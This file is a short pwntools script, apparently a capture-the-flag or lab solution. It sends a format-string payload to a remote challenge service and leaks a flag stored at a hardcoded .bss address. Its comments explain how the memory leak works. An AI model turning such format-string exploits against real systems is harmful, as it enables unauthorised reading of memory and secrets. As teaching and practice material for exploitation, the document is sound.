#!/usr/bin/python3

#import libraries
import sys
import pwn
#get some pwn stuff into global namespace
from pwn import p64, sleep
#disable annoying pwntools log messages (e.g. info regarding opened/closed connection)
pwn.context.log_level = 'error'

#assign host and port to connect to
host = "hacky2"
port = 13710
if len(sys.argv) >= 2:
    host = sys.argv[1]
if len(sys.argv) >= 3:
    port = int(sys.argv[2])


proc=pwn.remote(host,port,fam="ipv4")

proc.readline()

#This time around the flag is not loaded onto the stack, but into a global buffer.
#Since it is statically allocated, we find it in the .bss section of the binary.
#Other than the Stack this section is not affected by ASLR, and since PIE is not enabled, we can 
#  simply hardcode the address of the buffer in our format string and use %s to print its content 
#  as a string.
#Specifically we will use the positional argument with index 7, since index 0-5 refer to registers,
#  index 6 is the beginning of buf, at which our (padded) format string is placed, followed by the 
#  little endian address of the flag at index 7.
#Note that reversing the order of format string and address is not possible here, since the NULL 
#  bytes in the address would prematurely terminate the format string.
#Also note that padding the format string is necessary, to place the address on the stack at a 
# properly alligned position.
formatstr = b"%7$s" + 4*b"\x00" + p64(0x403400) + b"\x00\n"
proc.write(formatstr)
proc.readuntil(b"Pwn harder, ")
flag = proc.readuntil(b"!")[:-1].decode()

print(flag)

proc.close()


